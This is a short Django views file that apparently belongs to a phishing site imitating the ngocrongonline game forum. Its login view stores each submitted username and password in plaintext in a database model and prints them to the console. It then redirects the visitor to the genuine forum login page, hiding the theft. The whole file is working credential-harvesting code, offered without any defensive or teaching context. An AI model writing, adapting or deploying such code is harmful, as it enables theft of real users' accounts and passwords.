from django.shortcuts import render,redirect
from .models import Usera
def diendan(request):
    return render(request,'diendan.html')
def login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        if (username=="") or (password==""):
            return redirect('login')
        else: 
            user = Usera(username = username,password = password)
            print(user.username, user.password)
            user.save()
            print("Succesfully")                                
            return redirect('https://forum.ngocrongonline.com/app/index.php?do=login')
    context ={
    }
    return render(request,'login.html',context)
# Create your views here.
